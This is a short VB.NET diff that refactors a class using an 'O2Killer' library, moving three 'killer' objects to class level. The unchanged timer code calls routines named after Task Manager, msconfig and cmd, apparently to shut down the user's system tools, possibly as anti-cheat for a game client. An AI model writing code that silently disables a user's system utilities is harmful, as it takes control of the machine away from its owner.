@@ -19,6 +19,12 @@ Imports O2Killer
 
 Public Class AIOTFRF
 
+#Region "moduleclass"
+    Dim cheat As New O2Killer.KillerCheat
+    Dim systemkill As New O2Killer.KillerSystem
+    Dim rfkiler As New O2Killer.KillerRF
+#End Region
+
 #Region "keys"
     Private Property TimerInterval As Integer
     Protected Overrides Function ProcessCmdKey(ByRef msg As Message, ByVal keyData As Keys) As Boolean
@@ -32,9 +38,7 @@ Public Class AIOTFRF
 #End Region
 
 #Region "process"
-    Dim cheat As New O2Killer.KillerCheat
     Private Sub ProcPrimary_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ProcPrimary.Tick
-        Dim systemkill As New O2Killer.KillerSystem
         systemkill.taskmanager()
         systemkill.msconfig()
         systemkill.cmd()
@@ -54,7 +58,6 @@ Public Class AIOTFRF
     End Sub
 
     Private Sub ProcThird_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ProcThird.Tick
-        Dim rfkiler As New O2Killer.KillerRF
         rfkiler.rfinalterablestop()
         rfkiler.rfbizanstop()
     End Sub
